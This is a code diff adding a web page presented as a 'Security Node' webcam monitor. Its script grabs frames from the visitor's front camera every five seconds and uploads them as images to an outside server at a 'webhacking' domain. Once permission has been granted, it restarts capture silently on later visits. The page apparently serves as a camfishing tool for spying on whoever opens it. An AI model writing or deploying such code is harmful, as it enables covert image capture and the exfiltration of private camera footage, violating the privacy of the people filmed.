@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebCam Node</title>
+<style>
+  :root {
+    --primary: #2563eb;
+    --success: #16a34a;
+    --error: #dc2626;
+    --bg: #f8fafc;
+    --text: #334155;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: var(--bg);
+    color: var(--text);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background: white;
+    padding: 24px;
+    border-radius: 16px;
+    box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+    width: 90%;
+    max-width: 480px;
+    text-align: center;
+  }
+  h2 { margin-top: 0; font-weight: 700; color: #1e293b; }
+  
+  /* Video Container */
+  .video-wrapper {
+    position: relative;
+    width: 100%;
+    background: #000;
+    border-radius: 12px;
+    overflow: hidden;
+    aspect-ratio: 4/3;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  
+  video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+
+  /* Status Indicators */
+  .badge {
+    position: absolute;
+    top: 12px;
+    right: 12px;
+    padding: 6px 12px;
+    border-radius: 99px;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: white;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(4px);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    z-index: 10;
+  }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background-color: #94a3b8; }
+  .dot.live { background-color: var(--success); box-shadow: 0 0 8px var(--success); }
+  .dot.rec { animation: blink 1s infinite; background-color: var(--error); }
+
+  @keyframes blink { 50% { opacity: 0.5; } }
+
+  /* Controls */
+  .msg-box {
+    min-height: 40px;
+    font-size: 0.9rem;
+    color: #64748b;
+    margin-bottom: 15px;
+  }
+  
+  button {
+    background: var(--primary);
+    color: white;
+    border: none;
+    padding: 14px 28px;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    transition: transform 0.1s, background 0.2s;
+  }
+  button:hover { background: #1d4ed8; }
+  button:active { transform: scale(0.98); }
+  button:disabled { background: #cbd5e1; cursor: not-allowed; }
+  
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2>🔒 Security Node</h2>
+  
+  <div class="video-wrapper">
+    <div class="badge">
+      <div id="status-dot" class="dot"></div>
+      <span id="status-text">OFFLINE</span>
+    </div>
+    <!-- Placeholder message when video is off -->
+    <div id="placeholder" style="color:white; font-size: 0.8rem; position: absolute;">Initializing Camera...</div>
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+
+  <div id="msg-box" class="msg-box">Checking permissions...</div>
+  <button id="start-btn" class="hidden">Enable Camera Access</button>
+</div>
+
+<script>
+/**
+ * ⚠️ IMPORTANT FOR PERSISTENT PERMISSIONS ⚠️
+ * 1. This must be served via HTTPS (or localhost).
+ * 2. If served via HTTP, the browser will ALWAYS ask for permission.
+ */
+
+const API_URL = "https://webhacking.onrender.com/upload"; 
+const INTERVAL_MS = 5000;
+
+// UI Elements
+const video = document.getElementById("video");
+const startBtn = document.getElementById("start-btn");
+const statusDot = document.getElementById("status-dot");
+const statusText = document.getElementById("status-text");
+const msgBox = document.getElementById("msg-box");
+const placeholder = document.getElementById("placeholder");
+
+// State
+let stream = null;
+let isCapturing = false;
+
+// Optimization: Single canvas instance
+const canvas = document.createElement("canvas");
+const ctx = canvas.getContext("2d");
+
+// ----------------------------------------------------
+// 1. SMART INIT (The "Facebook-like" Logic)
+// ----------------------------------------------------
+async function init() {
+  // Check if the browser supports the Permissions API
+  if (navigator.permissions && navigator.permissions.query) {
+    try {
+      const result = await navigator.permissions.query({ name: "camera" });
+      
+      if (result.state === "granted") {
+        // PERMISSION ALREADY GRANTED -> Start immediately (Silent)
+        startCamera();
+      } else if (result.state === "prompt") {
+        // PERMISSION NOT YET ASKED -> Show button
+        showButton();
+      } else if (result.state === "denied") {
+        // PERMISSION DENIED -> Show error help
+        showError("Camera access was blocked. Please enable it in your browser settings.");
+      }
+
+      // Listen for changes (e.g. user resets permission while on page)
+      result.onchange = () => {
+        if (result.state === "granted") startCamera();
+        if (result.state === "denied") showError("Access revoked.");
+      };
+
+    } catch (error) {
+      // Fallback for browsers with partial API support (e.g. Firefox)
+      checkLocalStorageFallback();
+    }
+  } else {
+    // Fallback for older browsers
+    checkLocalStorageFallback();
+  }
+}
+
+// Fallback logic using LocalStorage
+function checkLocalStorageFallback() {
+  const previouslyAllowed = localStorage.getItem("cam_permission");
+  if (previouslyAllowed === "true") {
+    startCamera();
+  } else {
+    showButton();
+  }
+}
+
+function showButton() {
+  msgBox.textContent = "Camera access needed for surveillance.";
+  startBtn.classList.remove("hidden");
+  placeholder.textContent = "Camera Off";
+  placeholder.style.display = "block";
+}
+
+// ----------------------------------------------------
+// 2. CAMERA STARTUP
+// ----------------------------------------------------
+startBtn.addEventListener("click", startCamera);
+
+async function startCamera() {
+  try {
+    msgBox.textContent = "Starting video stream...";
+    startBtn.disabled = true;
+
+    // Request the camera
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        facingMode: "user", // or "environment" for back camera
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      },
+      audio: false
+    });
+
+    // Success!
+    video.srcObject = stream;
+    
+    // Remember this for next time (Fallback mechanism)
+    localStorage.setItem("cam_permission", "true");
+
+    video.onloadedmetadata = () => {
+      startBtn.classList.add("hidden"); // Hide button forever
+      placeholder.style.display = "none";
+      updateStatus("LIVE", "live");
+      msgBox.textContent = "Surveillance Active. Uploading to server...";
+      
+      // Start the upload loop
+      if (!isCapturing) {
+        isCapturing = true;
+        captureLoop();
+      }
+    };
+
+  } catch (err) {
+    console.error(err);
+    if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+      showError("Permission Denied. Click the lock icon in your URL bar to reset.");
+    } else {
+      showError("Camera Error: " + err.message);
+    }
+    startBtn.disabled = false;
+  }
+}
+
+function showError(msg) {
+  msgBox.innerHTML = `<span style="color: var(--error)">${msg}</span>`;
+  statusText.textContent = "ERROR";
+  statusDot.className = "dot error";
+}
+
+function updateStatus(text, type) {
+  statusText.textContent = text;
+  statusDot.className = "dot " + type;
+}
+
+// ----------------------------------------------------
+// 3. CAPTURE & UPLOAD LOOP
+// ----------------------------------------------------
+async function captureLoop() {
+  if (!stream || !isCapturing) return;
+
+  try {
+    // 1. Capture
+    if (canvas.width !== video.videoWidth) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+    }
+    ctx.drawImage(video, 0, 0);
+    const base64 = canvas.toDataURL("image/jpeg", 0.7); // 70% quality JPEG
+
+    // 2. Upload
+    // Show "REC" dot while uploading
+    updateStatus("UPLOADING", "rec");
+    
+    const res = await fetch(API_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image: base64 })
+    });
+
+    if (res.ok) {
+      const data = await res.json();
+      msgBox.textContent = `Uploaded: ${new Date().toLocaleTimeString()}`;
+    } else {
+      throw new Error("Server rejected upload");
+    }
+
+  } catch (err) {
+    console.error("Loop Error:", err);
+    msgBox.textContent = "Connection unstable. Retrying...";
+  } finally {
+    // Set status back to LIVE
+    updateStatus("LIVE", "live");
+    // Schedule next frame ONLY after this one finishes (prevents crashing)
+    setTimeout(captureLoop, INTERVAL_MS);
+  }
+}
+
+// Start everything
+document.addEventListener("DOMContentLoaded", init);
+
+</script>
+
+</body>
+</html>
